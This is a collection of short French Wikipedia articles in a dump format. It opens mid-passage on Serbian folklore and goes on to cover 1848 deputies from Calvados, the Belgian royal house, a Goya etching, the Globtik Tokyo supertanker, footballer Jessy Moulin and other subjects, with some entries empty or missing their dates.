Dans l'est de la Serbie, on croyait que les ale qui se mêlaient aux gens pouvaient se métamorphoser en êtres humains ou en animaux, après quoi leur réelle identité n'était détectable que par les êtres appelés "šestaci" - des hommes avec six doigts à chaque main et six orteils à chaque pied - même si les ale d'apparence humaine faisaient trembler les maisons dans lesquelles elles entraient. Selon une croyance de l'Homolje, région de Serbie, les ale qui s'en étaient pris à la Lune dans l'intention de la détruire, font aussi preuve d'une capacité de métamorphose : elles passent à maintes reprises de leur forme d'origine, celle de serpent à deux têtes, à celle d'homme à six doigts qui tient une fourche de fer, d'un jeune taureau noir, d'un gros sanglier, ou d'un loup noir, avant de reprendre leur forme originelle.

</doc>
<doc id="7280189" url="https://fr.wikipedia.org/wiki?curid=7280189" title="Les Sœurs Robin">
Les Sœurs Robin



</doc>
<doc id="7280192" url="https://fr.wikipedia.org/wiki?curid=7280192" title="Jean-Charles Besnard">
Jean-Charles Besnard

Jean-Charles Besnard est un homme politique français né le à Vire (Calvados) et mort le à Paris.
Agent d'affaires à Vire, il est sous-commissaire de la République en 1848. Il est député du Calvados de 1848 à 1849, siégeant à droite.

</doc>
<doc id="7280193" url="https://fr.wikipedia.org/wiki?curid=7280193" title="Italienisches Liederbuch">
Italienisches Liederbuch

L’Italienisches Liederbuch ("Livre de chansons italiennes") est formé de deux recueils de lieder de Hugo Wolf, dont le premier paraît en 1891 et le second en 1896.
Les textes des lieder, adaptés de récits ou de chansons populaires, sont signés par l'écrivain allemand Paul Heyse, lauréat du prix Nobel de littérature en 1910.
Lieder fameux.
Parmi les plus vantés de ces lieder, on citera :

</doc>
<doc id="7280194" url="https://fr.wikipedia.org/wiki?curid=7280194" title="Mine de Chambishi">
Mine de Chambishi

La mine de Chambishi est une mine à ciel ouvert de cuivre située en Zambie. Elle appartient à des capitaux chinois.

</doc>
<doc id="7280198" url="https://fr.wikipedia.org/wiki?curid=7280198" title="Andries Hendrik">
Andries Hendrik



</doc>
<doc id="7280199" url="https://fr.wikipedia.org/wiki?curid=7280199" title="Ceinture de cuivre">
Ceinture de cuivre

La ceinture de cuivre ou ceinture du cuivre () est une région minière entre la province de Copperbelt en Zambie et l'ancienne province de Katanga en République démocratique du Congo. Comme son nom l'indique, elle produit essentiellement du cuivre.
Elle représente 10 % du produit intérieur brut (PIB), 10 % des recettes publiques et 70 % des recettes d’exportations de la Zambie. La route Transafricaine 9 (Beira (Mozambique) — Lobito) traverse Ceinture de cuivre.

</doc>
<doc id="7280203" url="https://fr.wikipedia.org/wiki?curid=7280203" title="Janvier 1954">
Janvier 1954

Cette page présente les faits marquants du mois de .

</doc>
<doc id="7280205" url="https://fr.wikipedia.org/wiki?curid=7280205" title="Franco-Australien">
Franco-Australien



</doc>
<doc id="7280206" url="https://fr.wikipedia.org/wiki?curid=7280206" title="Grit Lehmann">
Grit Lehmann

Grit Lehmann est une ancienne joueuse allemande de volley-ball née le à Berlin. Elle mesure 1,82 m et jouait au poste d'attaquante.

</doc>
<doc id="7280210" url="https://fr.wikipedia.org/wiki?curid=7280210" title="Le Journal d'une femme en blanc - Tome 1">
Le Journal d'une femme en blanc - Tome 1



</doc>
<doc id="7280215" url="https://fr.wikipedia.org/wiki?curid=7280215" title="Euphorbia hofstaetteri">
Euphorbia hofstaetteri

Euphorbia hofstaetteri est une espèce de plantes à fleurs de la famille des euphorbiacées endémique de Madagascar.
Habitat.
Son habitat naturel sont les broussailles sèches subtropicales, ou tropicales, et les zones rocheuses. Elle est menacée par la destruction de son habitat.

</doc>
<doc id="7280216" url="https://fr.wikipedia.org/wiki?curid=7280216" title="Maison de Belgique">
Maison de Belgique

La maison de Belgique ou maison de Saxe-Cobourg (en allemand : "Haus Sachsen-Coburg" ; en néerlandais : "Huis Saksen-Coburg") est la maison royale de Belgique, branche cadette de la maison de Saxe-Cobourg et Gotha, elle-même issue de la branche ernestine de la maison de Wettin.
La maison de Saxe-Cobourg et Gotha est issue du premier roi des Belges, , né prince de Saxe-Cobourg-Saalfeld. En 1921, le titre de la maison de Saxe-Cobourg et Gotha fut abandonné officieusement dans un contexte de fort sentiment anti-germanique né de la Première Guerre mondiale et de l'occupation allemande, laissant s'installer l'expression « de Belgique » pour la famille royale belge.
Depuis le "Carnet Mondain" de 2017, en plus du titre de "prince de Belgique", le titre de "prince de Saxe-Cobourg-Gotha" est de nouveau en usage pour certains descendants de . Le patronyme utilisé par les membres de la maison royale est « de Belgique » (ou « van België »).
Titres et patronyme.
La famille royale belge est issue d'une branche cadette de la branche ernestine de la maison de Wettin régnant sur le duché de Saxe-Cobourg-Saalfeld depuis le milieu du , le duché de Saxe-Cobourg-Saalfeld disparaît en 1826, après la réorganisation des duchés saxons consécutive à l'extinction de la lignée de Saxe-Gotha-Altenbourg. Le duc Ernest III de Saxe-Cobourg-Saalfeld reçoit Gotha, mais doit céder Saalfeld au duché de Saxe-Meiningen. Il prend dès lors le nom de Ernest de Saxe-Cobourg et Gotha.
Le futur roi des belges, Léopold de Saxe-Cobourg-Saalfeld, prince de Saxe-Cobourg et Gotha, duc en Saxe, frère du duc régnant Ernest de Saxe-Cobourg et Gotha changea également son nom en devenant Léopold de Saxe-Cobourg et Gotha, donnant de ce fait ce nom à la famille royale belge.
À l'issue de la Première Guerre mondiale et de l'occupation allemande, sous l'impulsion du roi Albert de Belgique et dans un contexte de germanophobie ambiant, les princes belges ont préféré ne plus utiliser leurs titres allemands de leurs alors que la monarchie belge a opté pour une forme patronymique plus « nationale » en désignant officieusement en 1921 la dynastie sous le nom "de Belgique" (en néerlandais, "van België" et en allemand, "von Belgien") ; la maison royale britannique a eu également recours à cette méthode en 1917.
Réforme de 2015 relative à l'octroi du titre de "prince ou princesse de Belgique".
Le une réforme importante de la maison royale fut publiée au "Moniteur belge". Le roi Philippe de Belgique se souciant de limiter l'accroissement du nombre des porteurs du titre de "prince de Belgique" ou de "princesse de Belgique" à travers les branches collatérales de la famille royale belge, il fut décidé qu'à partir de la publication de l'arrêté royal du et pour les naissances à venir, seuls les enfants et petits-enfants issus de la descendance directe du roi des Belges, ainsi que les enfants et petits-enfants issus de la descendance directe du prince héritier ou de la princesse héritière porteraient le titre de "prince de Belgique" ou de "princesse de Belgique". Les princes et princesses, issus de la descendance directe du roi Léopold qui ne sont pas enfants ou petits-enfants du roi ou de la reine des Belges, enfants ou petits-enfants du prince héritier ou de la princesse héritière portent à la suite de leur prénom et leur nom, les titres qui leur reviennent de droit par leur ascendance, à savoir : prince de Saxe-Cobourg et Gotha et de duc en Saxe avec le prédicat d'altesse royale. Quant au nom patronymique, les règles qui s'y appliquent ne changent pas.
Exemples :
À la suite de l'arrêt de la Cour d'appel de Bruxelles du , Delphine Boël a été reconnue comme fille du Roi Albert II. La Cour d'appel a ainsi signifié que Delphine Boël s'appellerait dorénavant Delphine de Saxe-Cobourg, puisque le nom de la famille royale mentionné dans la Constitution est « Saxe-Cobourg » . Par ailleurs, en application de l'article 2 de l'arrêté royal du 12 novembre 2015, en tant que fille du Roi Albert II, la Cour d'appel autorise Delphine de Saxe-Cobourg à être qualifiée du titre de princesse de Belgique. Il en va de même pour ses enfants en leur qualité de petits enfants du roi Albert II. Cet arrêt de la cour d'appel pourrait faire jurisprudence quant au nom de la famille royale.
Réforme de 2015 relative aux titres de "prince et princesse de Saxe-Cobourg" et de "duc et duchesse de Saxe".
Depuis le "Carnet Mondain" de 2017 (les informations concernant la famille royale de Belgique y sont reproduites telles qu'elles sont communiquées par le Palais), on retrouve pour les descendants de (à l'exception des enfants/petit-enfant d'Astrid et Lorenz), en plus de leur titre de "prince ou princesse de Belgique", les anciens titres abandonnés après la Première Guerre mondiale de "prince ou princesse de Saxe-Cobourg-Gotha" et de "duc ou duchesse de Saxe". Les princes et princesses né(e)s après 2015 et qui n'ont plus droit au titre de "prince ou princesse de Belgique" (à cause de la réforme de 2015) reçoivent uniquement les titres de "prince ou princesse de Saxe-Cobourg" et de "duc ou duchesse de Saxe".
Titulature complète.
Titulature complète tel que publiée dans le "Carnet mondain 2017" (les informations concernant la famille royale de Belgique y sont reproduites telles qu'elles sont communiquées par le Palais) :
Armoiries royales.
Les armoiries royales ont été modifiées par l'arrêté royal du , paru au "Moniteur belge" du (2e édition). Une des principales modifications consiste en l'ajout, "sur l'épaule du lion d'or, d'un écusson burelé d'or et de sable de dix pièces, au crancelin de sinople, brochant en bande sur le tout". Cet écusson saxon, qui avait été adopté en 1425 par la maison de Wettin comme symbole de leur dignité électorale, figurait sur le blason royal de Belgique jusqu'après la Première Guerre mondiale. Aucun texte n'avait expressément confirmé cet abandon de l'écusson saxon mais il ne figurait plus depuis lors dans les armoiries royales. L'arrêté royal du rétablit ainsi une longue tradition en rétablissant l'écusson saxon dans les armoiries royales.
Une seconde consiste en la mention de la devise de la Belgique : "L'union fait la force" dans les trois langues nationales du pays (jusqu'alors, elle n'était mentionnée qu'en français sur le blason).
Par ailleurs, le même arrêté royal prévoit que le roi ou la reine qui a abdiqué porte ces mêmes armes mais chargées d'un lambel à trois pendants de gueules, surchargé de la couronne royale.
Membres de la maison par souverain.
Fils du duc François de Saxe-Cobourg-Saalfeld (1750-1806) et de la comtesse Augusta Reuss d'Ebersdorf (1757-1831), le prince Léopold de Saxe-Cobourg-Saafeld devient en 1831 le premier souverain belge sous le nom de . (alors prince) épouse, le , la princesse Charlotte de Galles qui met au monde un garçon mort-né le et décède en couches le lendemain. En secondes noces, il épouse, le , la princesse Louise d'Orléans, qui donne à la dynastie quatre enfants.
Deuxième fils du roi (1790-1865) et de la princesse Louise d'Orléans (1812-1850), le duc de Brabant devient en 1865 le deuxième souverain belge sous le nom de . (alors duc) épouse, le , l'archiduchesse Marie-Henriette d'Autriche, avec qui il a quatre enfants.
Le prince Albert, fils du comte de Flandre et neveu de , devient le roi à la mort de son oncle, qui n'a pas de postérité mâle et légitime.
Second fils de Philippe de Belgique (1837-1905), comte de Flandre et de la princesse Marie de Hohenzollern-Sigmaringen (1845-1912), le prince Albert devient en 1909 le troisième souverain belge sous le nom d'. (alors prince) épouse, le , la duchesse Élisabeth en Bavière, avec qui il a trois enfants.
Fils du roi (1875-1934) et de la duchesse Élisabeth en Bavière (1876-1965), le prince Léopold, duc de Brabant devient en 1934 le quatrième souverain belge sous le nom de . (alors prince) épouse, le , la princesse Astrid de Suède, avec qui il a trois enfants.
Le , le roi Léopold épouse Lilian Baels, titrée princesse de Belgique, connue sous le titre de « princesse de Réthy ». Le couple a trois enfants.
Baudouin.
Premier fils du roi (1901-1983) et de la princesse Astrid de Suède (1905-1935), le prince Baudouin devient en 1950 le roi Baudouin. Baudouin épouse, le doña Fabiola de Mora y Aragón, avec qui il n'a pas d'enfant.
Le prince Albert, prince de Liège, deuxième fils de , devient à la mort de son frère Baudouin le roi .
Deuxième fils du roi (1901-1983) et de la princesse Astrid de Suède (1905-1935), le prince Albert devient en 1993 le roi . Albert épouse, le Paola Ruffo di Calabria, avec qui il a trois enfants.
Philippe.
Premier fils du roi (1934) et de Paola Ruffo di Calabria (1937), le prince Philippe devient roi des Belges en 2013. Philippe épouse, le , Mathilde d'Udekem d'Acoz, avec qui il a quatre enfants.

</doc>
<doc id="7280217" url="https://fr.wikipedia.org/wiki?curid=7280217" title="Liste des héritiers du trône de Belgique">
Liste des héritiers du trône de Belgique

En Belgique, l'héritier du trône ne porte pas systématiquement le titre de duc de Brabant. Instauré par l'arrêté royal du , celui-ci est réservé initialement au fils aîné du roi, ou à défaut au fils aîné du fils aîné. Puisque la Couronne de Belgique se transmet par primogéniture simple depuis 1991, il est réservé, depuis une réforme par l'arrêté royal du , à l’enfant (fils ou fille) aîné du roi des Belges, ou à son défaut, par l’enfant (fils ou fille) aîné de l’enfant aîné du roi. Cet article recense l’ensemble des héritiers du trône de Belgique depuis 1833 à nos jours.
Parmi ceux-ci, seuls les princes héritiers sont numérotés dans le tableau ci-dessous, pas les héritiers présomptifs.

</doc>
<doc id="7280221" url="https://fr.wikipedia.org/wiki?curid=7280221" title="Félix Person">
Félix Person

Félix Person est un homme politique français né le à Caen (Calvados) et mort le à Graye (Calvados).
Biographie.
Après une courte carrière militaire sous le Premier Empire, il devient éleveur de chevaux. Opposant à la Monarchie de Juillet, il est député du Calvados de 1848 à 1849, siégeant à la gauche modérée.

</doc>
<doc id="7280222" url="https://fr.wikipedia.org/wiki?curid=7280222" title="Que se la llevaron!">
Que se la llevaron!

L'eau-forte Que se la llevaron! est une gravure de la série "Los caprichos" du peintre espagnol Francisco de Goya. Elle porte le numéro huit dans la série des 80 gravures. Elle a été publiée en 1799.
Interprétations de la gravure.
Il existe divers manuscrits contemporains qui expliquent les planches des Caprichos. Celui qui se trouve au Musée du Prado est considéré comme un autographe de Goya, mais semble plutôt chercher à dissimuler et à trouver un sens moralisateur qui masque le sens plus risqué pour l'auteur. Deux autres, celui qui appartient à Ayala et celui qui se trouve à la Bibliothèque nationale, soulignent la signification plus décapante des planches.
Technique de la gravure.
Le premier dessin préparatoire est tiré de l'Album de Madrid. C'est un lavis à l'encre de chine avec des traces de pierre noire. En haut à droite : « 61 », en haut au centre : « caricaturs ». Dans la marge inférieure, à gauche : « "Es dia de su santo" » (« "C'est le jour de sa fête" »). Ajouté en haut au centre : « 4 ». L'image reproduit l'exemplaire du Musée du Louvre. Le premier dessin préparatoire mesure .
L'arbre à l'arrière sur le second dessin préparatoire à la sanguine, conservé au Musée du Prado, a été supprimé sur la gravure approfondissant la plaine désolée. Dans l'angle inférieur gauche, au crayon : « 6 » ; à côté à l'encre : « 6 ». Le second dessin préparatoire mesure .
Goya a utilisé pour l'estampe l'eau-forte et l'aquatinte. L'estampe mesure sur une feuille de papier de .

</doc>
<doc id="7280223" url="https://fr.wikipedia.org/wiki?curid=7280223" title="Chapelle Saint-Maurice du Moustoir">
Chapelle Saint-Maurice du Moustoir

La chapelle Saint-Maurice du Moustoir est une chapelle catholique située dans la commune de Rosporden, en Bretagne. L'édifice actuel de style gothique est édifié du à proximité de l'important chemin d'origine gallo-romaine servant au pèlerinage du Tro Breizh.
Le clocher a été abattu par un orage en 1937
Elle est classée monument historique depuis le .
Histoire.
La chapelle Saint-Maurice du Moustoir est dédiée à saint Maurice de Langonnet, connu aussi sous le nom de saint Maurice de Carnoët.
Architecture.
La chapelle possède un magnifique portail datant du , inspiré par la chapelle de chapelle de Saint-Herbot.

</doc>
<doc id="7280225" url="https://fr.wikipedia.org/wiki?curid=7280225" title="Jacques Desclais">
Jacques Desclais

Jacques Desclais est un homme politique français né le à Caen (Calvados) et mort le à Caen.
Ordonné prêtre en 1825, il est curé de Cresserons en 1830. Il est député du Calvados de 1848 à 1849, siégeant avec les républicains modérés.

</doc>
<doc id="7280233" url="https://fr.wikipedia.org/wiki?curid=7280233" title="Pierre Hervieu">
Pierre Hervieu

Pierre Hervieu est un homme politique français né le à Ryes (Calvados) et mort le à Ryes.
Biographie.
Propriétaire terrien, opposant à la Monarchie de Juillet, il est député du Calvados de 1848 à 1849, siégeant à droite.

</doc>
<doc id="7280234" url="https://fr.wikipedia.org/wiki?curid=7280234" title="Iekaterina Ripnaïa">
Iekaterina Ripnaïa

Iekaterina Sergueïevna Ripnaïa (en ) est une joueuse de volley-ball russe née le . Elle mesure et joue au poste de réceptionneuse-attaquante. 

</doc>
<doc id="7280238" url="https://fr.wikipedia.org/wiki?curid=7280238" title="Jean Lemonnier (homme politique)">
Jean Lemonnier (homme politique)

Jean Lemonnier, né le à Rouen (Seine-Inférieure) et mort le à Falaise (Calvados), est un homme politique français.
Biographie.
Ouvrier tourneur, il est blessé au pied et reste handicapé. Théoricien socialiste, il est député du Calvados de 1848 à 1849, siégeant au groupe d'extrême gauche de la Montagne.

</doc>
<doc id="7280241" url="https://fr.wikipedia.org/wiki?curid=7280241" title="Ministre-président de Bavière">
Ministre-président de Bavière

Le ministre-président de Bavière () est le chef du gouvernement de l'État libre de Bavière. Il dirige le gouvernement de Bavière.

</doc>
<doc id="7280242" url="https://fr.wikipedia.org/wiki?curid=7280242" title="Timofey Chalyy">
Timofey Chalyy

Timofey Chalyy (en ; né le à Krasnoïarsk) est un athlète russe, spécialiste du 400 mètres haies.
Biographie.
Il bat le record des Championnats d'Europe juniors le à Rieti. Son précédent record est de 49 s 78, record national junior pour remporter le titre de champion russe junior à Kazan.

</doc>
<doc id="7280247" url="https://fr.wikipedia.org/wiki?curid=7280247" title="Hande Korkut">
Hande Korkut

Hande Korkut est une joueuse de volley-ball turque née le à Diyarbakır. Elle mesure et joue au poste de centrale. 
Liens externes.
 

</doc>
<doc id="7280250" url="https://fr.wikipedia.org/wiki?curid=7280250" title="Combat de Merchtem">
Combat de Merchtem

Le combat de Merchtem se déroule le pendant la guerre des Paysans. Il s'achève par la victoire des républicains qui mettent en fuite une troupe insurgée à Merchtem.
Prélude.
Dans le département de la Dyle, l'insurrection commence à Asse, Merchtem et Londerzeel au soir du . Les insurgés prennent pour chef Franz Seghers, un ancien mayeur. La bande parcourt les environs d'Asse et de Opwijk, elle recrute des jeunes gens, lève des contributions et pille les maisons des administrateurs républicains.
À la fin du mois d'octobre 1798, le juge de paix de Merchtem signale que la place a été envahie par les insurgés et demande des secours. Les républicains de Bruxelles décident alors de former une expédition sur cette commune.
La troupe républicaine est forte de 48 hommes, composés de gendarmes à cheval, de fantassins et de 8 volontaires, dont 7 sont des fonctionnaires publics. Elle est commandée par Claret, ancien juge de paix et Bertrand, lieutenant de gendarmerie. Le détachement sort de Bruxelles le à quatre heures du matin et gagne Assche sans rencontrer de résistance, puis elle se porte sur le village de Molhem. Soupçonné de complicité avec les rebelles, l'agent municipal du village est arrêté. Menacé, il donne des informations sur les insurgés et déclare qu'ils sont commandés par Seghers. Les Républicains relâchent l'agent municipal, ferment l'église et tentent d'en briser les cloches qui avaient sonné le tocsin la veille. 
Déroulement.
Les républicains sont découverts et le tocsin retentit à Maesel et peut-être à Mazenzele. Claret donne alors l'ordre à sa troupe de marcher sur Merchtem. Les républicains pénètrent dans le bourg, abandonné par ses habitants, ils trouvent la maison du juge de paix pillée par les insurgés et fouillent la maison de Seghers, sans résultat. La colonne gagne alors l'ancien château seigneurial et y rencontre les forces rebelles, armées de piques et de fourches. Retranchés derrière des fossés, les quelques paysans équipés de fusils ouvrent le feu mais les républicains chargent immédiatement à la baïonnette. Peu aguerris, les paysans prennent la fuite vers Steenhuffel, mais plusieurs sont pris à revers par les gendarmes à cheval et sabrés. 
Pertes.
Les républicains reportent un petit succès mais celui-ci ne met nullement fin à l'insurrection dans le département. 21 paysans sont tués, 17 sont capturés, dont deux capucins. La colonne regagne Bruxelles. Les prisonniers sont jugés par un conseil mais ils ne sont condamnés qu'à de courtes peines d'emprisonnement, trois sont acquittés, dont les deux moines. Les Républicains perdent deux hommes, dont un volontaire de Londerzeel capturé par les insurgés et fusillé à Termonde.

</doc>
<doc id="7280263" url="https://fr.wikipedia.org/wiki?curid=7280263" title="Chapelle Saint-Maurice">
Chapelle Saint-Maurice

Plusieurs chapelles en France ont été nommées chapelle Saint-Maurice en référence à saint Maurice d’Agaune, parmi lesquelles :

</doc>
<doc id="7280264" url="https://fr.wikipedia.org/wiki?curid=7280264" title="OSCA">
OSCA



</doc>
<doc id="7280266" url="https://fr.wikipedia.org/wiki?curid=7280266" title="Håkan Södergren">
Håkan Södergren

Karl Håkan Södergren (né le à Rosersberg en Suède) est un joueur professionnel suédois de hockey sur glace devenu entraîneur. Il évolue au poste d'attaquant.
Biographie.
Carrière en club.
Formé au Rosersbergs IK, il débute dans l'Elitserien en 1977 avec le Djurgården Hockey. Il remporte le Trophée Le Mat 1983, 1989, 1990 et 1991. Il met un terme à sa carrière en 1992 après une saison avec le Huddinge IK.
Carrière en équipe nationale.
Il représente la Suède au niveau international. Il est champion du monde en 1987 et médaillé d'argent en 1986. Il est médaillé de bronze olympique en 1984 et 1988. Il prend part à la Coupe Canada 1987 ainsi qu'aux sélections jeunes.

</doc>
<doc id="7280268" url="https://fr.wikipedia.org/wiki?curid=7280268" title="Thick as a Brick 2">
Thick as a Brick 2

Thick as a Brick 2 est le cinquième album studio de Ian Anderson sorti en 2012.
Comme son titre l'indique, il s'agit d'une suite de l'album-concept "Thick as a Brick", sorti sous le nom de Jethro Tull en 1972. Ainsi, sa pochette représente la page d'accueil du site web "StCleve.com", qui correspond à la version moderne du "St Cleve Chronicle", journal local fictif dont la une constituait la pochette du premier "Thick as a Brick".
L'histoire de l'album est résumée par son sous-titre, "Whatever Happened to Gerald Bostock" (« Qu'est devenu Gerald Bostock ? »). Le premier "Thick as a Brick" se présentait comme la mise en musique d'un long poème rédigé par un enfant prodige de 10 ans, Gerald Bostock. "Thick as a Brick 2" envisage plusieurs des futurs possibles de Bostock, et le dépeint tour à tour comme un "trader", un clochard, un soldat, un pasteur ou un petit épicier de quartier.
Titres.
Là où "Thick as a Brick" ne comprenait qu'une unique chanson (divisée en deux parties pour des raisons pratiques, liées au format vinyle), "Thick as a Brick 2" compte 17 chansons réparties en 13 pistes. Toutes sont écrites et composées par Ian Anderson.

</doc>
<doc id="7280270" url="https://fr.wikipedia.org/wiki?curid=7280270" title="Sebastian Pflugbeil">
Sebastian Pflugbeil

Sebastian Pflugbeil, né le à Bergen en Rügen (Mecklembourg-Poméranie-Occidentale) est un homme politique est-allemand. Il est brièvement ministre sans portefeuille en 1990.

</doc>
<doc id="7280272" url="https://fr.wikipedia.org/wiki?curid=7280272" title="Jang Hyuk">
Jang Hyuk

Jang Hyuk est un acteur coréen, né le à Busan.
Biographie.
Enfant, Jang Hyuk a passé la majeure partie de sa vie à Busan, sa ville natale. Il débute dans le drama "Model" en 1997.
Au début des années 2000, il remporte une certaine notoriété avec "Volcano High", lequel figure dans les dix films les plus rentables de 2001 en Corée du Sud.
Il confirme cette révélation auprès du grand public avec le long-métrage "Jungle Juice" et le drama à succès "Successful Story of a Bright Girl" aux côtés de l'actrice Jang Na-ra. Toujours en 2002, il tient l'un des rôles principaux dans la co-production sud-coréenne, hongkongaise et japonaise "Public Toilet" réalisé par Fruit Chan. Le film reçoit une mention spéciale dans le cadre du prix San Marco à la Mostra de Venise.
Sa popularité en Asie s'accroit en 2004 : la romance dramatique "Windstruck," où il partage l'affiche avec l'actrice Jun Ji Hyun, suscite l'intérêt des spectateurs. Le long-métrage se place à la 8ème position des plus gros succès du cinéma sud-coréen de l'année.
Appelé à faire son service militaire en 2004, Jang Hyuk tente d'éviter la convocation. La polémique qui s'ensuit le pousse à présenter des excuses publiques et effectuer son service militaire.
Après son service militaire, il fait son retour à la télévision en 2006 avec la série romantique et dramatique "Thank You." En dépit des scandales antérieurs, ce comeback est un succès : le drama est très largement suivi par les spectateurs et remporte plusieurs prix au MBC Drama Awards.
Sa popularité ne s'est pas démentie depuis, Jang Hyuk enchaînant les rôles sur le petit et le grand écrans. Il est notamment à l'affiche de "Pandémie", "Innocent Thing "ainsi que de deux films de Choi Jae-hoon, ' et '.
Activités annexes.
Jang pratique le jeet kune do depuis plus de 10 ans et est un ancien taekwondoiste professionnel.
Vie privée.
Le , Jang s'est marié avec sa petite amie de longue date Kim Yeo-jin. Le couple est ensemble depuis 2002, elle était sa professeur de pilates. Ses amis proches, le chanteur Kim Jong-kook et l'acteur Cha Tae-hyun ont participé à la cérémonie de mariage.
Le couple a trois enfants, nés en 2008, 2009 et 2015.

</doc>
<doc id="7280275" url="https://fr.wikipedia.org/wiki?curid=7280275" title="Hélicoptère de reconnaissance">
Hélicoptère de reconnaissance

Un hélicoptère de reconnaissance est un hélicoptère servant à observer une cible définie depuis le ciel. Il peut agir la plupart du temps de jour comme de nuit et dans un assez grand nombre de conditions grâce à un panel d'instruments aidant le pilote, comme des lunettes à vision infrarouge.

</doc>
<doc id="7280277" url="https://fr.wikipedia.org/wiki?curid=7280277" title="Saison 1 de Green Lantern (série télévisée d'animation)">
Saison 1 de Green Lantern (série télévisée d'animation)



</doc>
<doc id="7280279" url="https://fr.wikipedia.org/wiki?curid=7280279" title="Globtik Tokyo">
Globtik Tokyo

Le Globtik Tokyo est un supertanker, le premier d'une série de trois sister-ships. C'était le plus grand pétrolier du monde au moment de son lancement, avec et . Il perd cette distinction en 1973, après le lancement de son jumeau le "Globtik London". De même longueur que le "Tokyo", le "London" avait un port en lourd supérieur de . La capacité des deux navires était de de litres ( de barils).
Historique.
Le "Globtik Tokyo" est un navire destiné au transport de pétrole brut (ULCC). Il est commandé au début des années 1970 par Ravi Tikkoo, le président le la compagnie maritime londonienne Globtik Tankers, auprès du chantier naval japonais Ishikawajima Harima Heavy Industries de Kure (IHI). La quille est posée le , et il est mis à flot le . Il est livré en . À partir de son voyage inaugural dans le golfe Persique, il est affrété pour 20 ans par la compagnie japonaise Tokyo Tankers. En , cette compagnie affrète également le "Globtik London", deuxième navire de la série, tandis qu'elle devient propriétaire du troisième sister-ship, le "Nissei Maru", construit en 1974-1975.
Les "Globtik Tokyo" et "London" sont vendus au Japon en 1979, et passent sous pavillon libérien. Ils sont retirés du service et vendus à la Corée du Sud pour être démantelés, le "London" en 1985 et le "Tokyo" en 1986, par Hyundai à Ulsan.
Le "Globitk Tokyo" a été démantelé côte à côte avec un autre géant des mers, le "Bellamya".
Le troisième navire de la série, le "Nissei Maru", est démoli en 2003.
Caractéristiques.
Le "Globtik Tokyo" dispose d'un système de propulsion et une timonerie situés à l’arrière. La silhouette du tanker comporte deux cheminées coniques hautes et minces, disposées côte-à-côte derrière la timonerie.
La propulsion est réalisée par des turbines à vapeur produisant un total de , accouplées à une seule hélice à pas fixe. À 90 % de sa puissance maximum, le "Globtik Tokyo" consomme environ 200 tonnes de carburant par jour. Il est capable d’une vitesse de 17 nœuds sur ballast, et 14,5 à pleine charge. Il est particulièrement manœuvrant pour sa taille, son rayon de giration étant inférieur à trois fois sa longueur, et il est capable de s’arrêter sur une distance de trois milles avec sa seule hélice en marche arrière.
Un système de gaz inerte est utilisé pour éviter les explosions pendant le remplissage des réservoirs. Trois groupes diesel auxiliaires fournissent l'approvisionnement en énergie.

</doc>
<doc id="7280284" url="https://fr.wikipedia.org/wiki?curid=7280284" title="Jessy Moulin">
Jessy Moulin

Jessy Moulin, né le à Valence, était un footballeur français évoluant au poste de gardien de but.
Biographie.
Jessy Moulin entre en junior à l'AS Saint-Étienne, où il signe son premier contrat professionnel en 2006. Prêté dès sa première saison professionnelle à l'AC Arles qui évolue en troisième division. Il prend part à vingt-sept rencontres avant d'être prêté une seconde fois consécutif en National sous les couleurs de l'EFC Fréjus Saint-Raphaël. 
Lors de la saison 2010-2011, il joue son premier match sous les couleurs stéphanoises lors de la réception du Stade rennais en entrant en jeu à la place de Jérémie Janot.
Après un nouveau prêt au Clermont Foot 63 en Ligue 2, il revient dans son club formateur où il est la doublure de Stéphane Ruffier. Le , il signe une prolongation avec l'AS Saint-Étienne jusqu'en . Très peu utilisé, il joue quelques matchs de coupe avant de découvrir la Ligue Europa en 2015 lors de la dernière journée de phase de poule et la réception de la Lazio de Rome.
Lors de la saison 2016-2017, à la suite de l'expulsion de Stéphane Ruffier en Ligue Europa, il garde les cages de l'AS Saint-Étienne pour le match retour de barrage face au Beitar Jérusalem le , ainsi que pour les trois premiers matchs du groupe C dans cette compétition contre les clubs de Mayence 05, RSC Anderlecht et FK Qabala. En , il prolonge son contrat jusqu'en 2020. Après la blessure de Ruffier deux mois plus tard, il est titulaire lors du match de Ligue 1 au stade du Moustoir contre le FC Lorient, mais est expulsé au bout de dix minutes de jeu&lt;ref name="Saison 2016/2017, 18ème journée - Feuille de match : FC Lorient - AS Saint-Étienne"&gt;&lt;/ref&gt;. Remplacé pour les rencontres suivantes par Anthony Maisonnial, il fait son retour dans les cages stéphanoises en championnat le , jour de ses 31 ans, au stade Pierre-Mauroy face au LOSC Lille&lt;ref name="Saison 2016/2017, 20ème journée - Feuille de match : LOSC - AS Saint-Étienne"&gt;&lt;/ref&gt;. Il joue également son premier derby dans les buts stéphanois lors de la victoire des siens 2 à 0 face à l'Olympique lyonnais. 
Lors de la saison 2017-2018, à la suite de la suspension de Stéphane Ruffier, il jouera quatre matchs dont trois en tant que titulaires dans le but stéphanois, il fera un super match face au Toulouse Football Club où il obtiendra une note de 9 sur 10 dans le journal l'équipe.
Lors de la saison 2018-2019, il est avec Loïc Perrin l'un des deux délégués syndicaux de l'UNFP au sein de l'ASSE. Durant cette saison, il ne joue qu'un seul match en Ligue 1 lors de la dernière journée. 
Lors de la saison 2019-2020, il joue deux matches en début de saison contre le Nîmes Olympique où il réalise plusieurs parades décisives permettant à son équipe d'obtenir une précieuse victoire à l'extérieur. Une semaine plus tard à Geoffroy-Guichard, il joue le derby et son équipe l'emporte 1-0. Depuis la mise à l'écart de Stéphane Ruffier par Claude Puel en février 2020, il est titulaire. Il joue ainsi la finale de la Coupe de France perdue face au Paris Saint-Germain.
Le 19 juillet 2021, il rejoint l'ESTAC Troyes.
Le 14 août 2023, il annonce prendre sa retraite à l'âge de 37 ans.

</doc>
<doc id="7280286" url="https://fr.wikipedia.org/wiki?curid=7280286" title="Graham Rogers">
Graham Rogers

Graham Rogers (né le à West Chester en Pennsylvanie) est un acteur américain. Il est surtout connu pour avoir joué l'un des personnages principaux dans la série dramatique/science-fiction, "Revolution" (2012-2013).
Biographie.
À l'âge de 18 ans, Graham Rogers s'est installé à Los Angeles en Californie afin de devenir acteur ou bien mannequin. Il s'est fait connaître en tournant dans de nombreuses publicités pour State Farm Insurance.
Carrière.
